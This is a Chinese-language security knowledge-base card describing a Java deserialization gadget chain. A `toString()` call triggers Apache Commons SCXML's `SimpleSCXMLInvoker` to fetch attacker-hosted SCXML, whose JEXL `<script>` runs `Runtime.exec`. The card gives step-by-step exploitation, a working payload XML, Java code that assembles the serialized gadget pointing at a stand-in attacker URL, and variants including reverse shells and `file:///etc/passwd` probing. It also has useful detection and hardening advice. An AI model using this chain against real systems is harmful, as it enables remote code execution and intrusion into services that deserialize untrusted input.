---
id: web-java-deserialization-tostring-scxml-remote-url-jexl-script-rce
title: 反序列化 toString 触发 SCXML 远程加载：SimpleSCXMLInvoker.invoke 把 source 交给 SCXMLReader.read(new URL())，JexlEvaluator 执行 <script> 内任意代码
type: scenario
domain: web
path: web/java/deserialization
technique: deserialization-tostring-simple-scxml-invoker-remote-url-jexl-script
aliases:
- Apache Commons SCXML 远程代码执行
- SimpleSCXMLInvoker 反序列化
- InvokerImpl toString invoke
- SCXMLReader.read(new URL(source))
- JexlEvaluator SCXML script
- scxml onentry script
tags:
- java
- deserialization
- scxml
- tostring
- gadget
- jexl
- remote-xml
- rce
cve: []
severity: high
confidence: medium
status: verified
created: '2026-05-16'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W8
  verified_at: '2026-11-09T02:42:04+08:00'
  notes: 已对照原文核对：入口 Test.handleScxmlRequest 对 query 做 Base64 解码后 new ObjectInputStream(...).readObject().toString()、InvokerImpl.toString 调 this.o.invoke(source, params)、SimpleSCXMLInvoker.invoke 用 SCXMLReader.read(new URL(source)) 拉远程 XML 并以 this.parentSCInstance.getEvaluator() 取 Evaluator、onentry/script 内的 JEXL 表达式执行反弹 shell、以及 POC 里反射构造 SCInstance(SCXMLExecutor) 并 setField evaluator/parentSCInstance 的顺序均与正文一致；原文未给 commons-scxml2 版本区间（仅 lib 截图），故不设 affected_versions；卡片把 Executor 与 SimpleDispatcher/SimpleErrorReporter 的装配写进骨架属正确补全；本次核对未读取图片，仅依据正文（lib 列表与反弹 shell 截图未核）；未在本机编译复跑 PoC
---

## 一句话结论

当反序列化入口在 `readObject()` 之后还会调用结果对象的 `toString()`（例如 `ois.readObject().toString()`），任何「`toString()` 里有危险委托」的业务类都会变成 gadget：本例 `InvokerImpl.toString()` 直接执行 `this.o.invoke(this.source, this.params)`，把 `o` 设为 `SimpleSCXMLInvoker` 后，其 `invoke` 会用 `SCXMLReader.read(new URL(source))` **拉取攻击者服务器上的 SCXML 文件**，再由 `JexlEvaluator` 执行 `<script>` 里的 JEXL 表达式，等于把「一个 Base64 参数」变成远程代码执行。

## 原理

- **入口形状决定 gadget 面**：`new ObjectInputStream(bais).readObject().toString()` 这种写法把「反序列化」和「字符串化」连在一起。反序列化本身已经能还原任意对象图（含内部字段），而 `toString()` 会调用该对象自身实现——所以攻击者不需要找 `readObject`/`readResolve` 里的责任代码，只要找一个 `toString()` 里有可利用委托的**应用内类**即可。
- **`InvokerImpl` 为什么是完美跳板**：它 `implements Serializable`，三个字段 `Invoker o`、`String source`、`Map params` 全由反序列化填充（`final` 字段也一样，序列化 hack 不受 `final` 限制）；`toString()` 里 `o.invoke(source, params)` 把「调哪个方法」「传什么参数」都交给了攻击者控制的字段值，且异常被包成 `RuntimeException` 抛出，不影响前面已完成的副作用。
- **`Invoker` 接口的实现选择**：`SimpleSCXMLInvoker.invoke(String source, Map<String,Object> params)` 的实现是 `SCXML scxml = SCXMLReader.read(new URL(source))`——`source` 是字符串，被直接当 URL 打开，支持 `http://`/`file://` 等任意协议。这一步没有白名单、没有本地文件限制，所以「远程取 XML」是天然的载荷投递通道。
- **为什么 SCXML 会执行代码**：`SCXMLReader` 解析的 `<scxml>` 文档允许 `<onentry><script>…</script></onentry>`，`SCXMLExecutor` 在进入该状态时用配置的 `Evaluator` 求值脚本内容。`JexlEvaluator` 用 JEXL 引擎执行，JEXL 允许属性链与方法调用（`''.getClass().forName(...).getRuntime().exec(...)`），所以脚本内容等价于任意 Java 调用；换成 `ECMAScriptEvaluator`/`GroovyEvaluator` 也是同样效果。
- **`parentSCInstance` 的前置条件**：`SimpleSCXMLInvoker.invoke` 里 `this.parentSCInstance.getEvaluator()` 与 `this.parentSCInstance.getExecutor()` 都要求该字段非空，因此构造 payload 时必须补一个 `SCInstance`。`SCInstance` 的构造器在部分版本不可直接调用，可用 `Class.forName` + `getDeclaredConstructor(SCXMLExecutor.class)` + `setAccessible(true)` 反射建出，并反射把 `evaluator` 字段设为 `JexlEvaluator`；`SCXMLExecutor` 也要一并构造（它自身 `Serializable`）。
- **为什么整体仍是「完整链」**：入口（反序列化）、触发点（toString）、载荷通道（远程 SCXML URL）、执行面（JEXL script）四段都在原文中被跑通，最终得到反向 shell，不依赖目标出网的第三方组件，也不依赖二次条件。

## 触发条件

- 应用把不可信数据交给 `ObjectInputStream.readObject()`，且在之后（或链式调用中）对返回对象调用 `toString()`——典型写法 `ois.readObject().toString()`、`String.valueOf(obj)`、字符串拼接、日志打印 `logger.info("{}", obj)`；
- 攻击者能控制反序列化对象的类型（即应用 classpath 里有 `InvokerImpl` 这类「`toString` 内委托外部对象方法」的类）；
- classpath 存在 `commons-scxml2`（`SimpleSCXMLInvoker`、`SCXMLReader`）与任一 JEXL/脚本 `Evaluator` 实现（如 `commons-jexl`）；
- 目标可访问攻击者服务器（HTTP/HTTPS）或能读本地 `file://` 路径；
- 攻击者能自行序列化该对象图（通常通过同版本依赖本地构造）。

## 利用步骤

1. 确认入口：审代码/黑盒看 `readObject()` 之后是否有 `toString()`、字符串拼接或日志输出；若返回体里出现了对象 `toString` 的文本，即为强信号。
2. 找 `toString` gadget：全局搜 `implements Serializable` 且 `toString()` 中有「调用字段对象方法」「拼 URL」「反射」的类；本例即 `InvokerImpl.toString → o.invoke(source, params)`。
3. 装配对象图：`SCXMLExecutor(JexlEvaluator, SimpleDispatcher, SimpleErrorReporter)` → 反射构造 `SCInstance(executor)` 并把 `evaluator` 字段设为同一个 `JexlEvaluator` → 反射把 `SimpleSCXMLInvoker.parentSCInstance` 指向它 → 用 `new InvokerImpl(simpleSCXMLInvoker, "http://attacker/1.xml", params)` 组装。
4. 序列化该对象图并 Base64，作为参数提交给目标接口。
5. 在攻击者服务器放 SCXML 载荷，`<onentry><script>` 内写 JEXL 表达式执行命令（反弹 shell 或写文件）。
6. 目标解密/反序列化后调用 `toString()` → `invoke` → 拉取远程 SCXML → JEXL 执行，命令落地。

## PoC

SCXML 载荷（放在攻击者 HTTP 服务上，`source` 指向它）：

```xml
<?xml version="1.0"?>
<scxml xmlns="http://www.w3.org/2005/07/scxml" version="1.0" initial="run">
  <state id="run">
    <onentry>
      <script>
        ''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')
      </script>
    </onentry>
  </state>
</scxml>
```

payload 构造骨架（同版本依赖下编译执行）：

```java
JexlEvaluator eval = new JexlEvaluator();
SCXMLExecutor exec = new SCXMLExecutor(eval, new SimpleDispatcher(), new SimpleErrorReporter());

Constructor<?> c = Class.forName("org.apache.commons.scxml2.SCInstance")
        .getDeclaredConstructor(SCXMLExecutor.class);
c.setAccessible(true);
SCInstance inst = (SCInstance) c.newInstance(exec);

SimpleSCXMLInvoker inv = new SimpleSCXMLInvoker();
setField(inst, "evaluator", eval);        // SCInstance.evaluator
setField(inv,  "parentSCInstance", inst); // SimpleSCXMLInvoker.parentSCInstance

InvokerImpl payload = new InvokerImpl(inv, "http://attacker/1.xml", new HashMap<>());
// serialize(payload) -> Base64 -> 提交给目标接口
```

等价于目标端执行：

```java
SCXML doc = SCXMLReader.read(new URL("http://attacker/1.xml"));
SCXMLExecutor e = new SCXMLExecutor(new JexlEvaluator(), new SimpleDispatcher(), new SimpleErrorReporter());
e.setStateMachine(doc);
e.go();   // 进入 run 状态 -> onentry -> <script> 求值 -> Runtime.exec
```

## 变体与关联

- **变体（协议）**：`source` 支持任何 `URL` 能打开的协议——`file:///etc/passwd` 类路径可做文件读取探测，`jar:`/`http:` 可做深度利用；目标不出网时优先考虑 `file://` 读取本地 SCXML。
- **变体（Evaluator）**：`JexlEvaluator` 换成 `ECMAScriptEvaluator`、`GroovyEvaluator`（若有 `groovy` 依赖）则脚本语法随引擎变化，能力不变。
- **变体（toString gadget）**：任何「`toString()` 里拼 `sql`/起请求/调反射/写文件」的业务类都能替代 `InvokerImpl`；`SimpleSCXMLInvoker` 也可被其它「URL 加载 + 求值」的组件（如模板引擎、`ScriptEngine`）替换。
- **关联**：[[web-java-deserialization-custom-readobject-runtime-exec]]（同为「业务类参与反序列化」的入口型漏洞，但那条的危险代码在 `readObject` 内；本卡在 `toString`）、[[web-java-expression-jelly-core-tag-jexl-injection-rce]]（同为「XML 当代码执行 + JEXL 求值」，本卡的 SCXML `<script>` 是同一类解析器副作用的另一种载体）、[[web-java-deser-yso-spring1-spring2-methodinvoketypeprovider-templatesimpl]]（`toString`/`invoke` 参与的 gadget 组合思路）。

## 检测与防御

- **入口层**：不要对不可信数据做 Java 原生反序列化；必须用时加 `ObjectInputFilter`/`ValidatingObjectInputStream` 白名单，并且**禁止对反序列化结果调用 `toString()`、字符串拼接或直接写日志**（`log.info("{}", obj)` 同样触发）。
- **代码层**：`toString()` 中不要委托外部对象的可执行方法；`implements Serializable` 的类只放纯数据，`toString` 只拼字段。审计时把「`Serializable` + `toString` 内调用其它对象方法」列为 sink 模式。
- **组件层**：`commons-scxml2` 的 `SCXMLReader.read(URL)` 不应接受外部输入；若业务必须解析 SCXML，改用本地固定文件、关闭 `<script>`（`SCXMLSemantics`/自定义 `Evaluator` 拒绝脚本），并移除 JEXL/Groovy 等脚本引擎依赖。
- **检测点**：反序列化接口的请求体出现 `org.apache.commons.scxml2`、`SimpleSCXMLInvoker`、`InvokerImpl`、`JexlEvaluator` 类名；Web 进程出站请求任意外部 URL（尤其 `.xml`）后立即派生子进程；JVM 中出现 `SCXMLReader`/`JexlEngine` 的调用栈。
- **加固**：以低权限账户运行、限制出站（仅白名单域名），使远程 SCXML 拉取失败；对 `file://` 读取做沙箱限制。
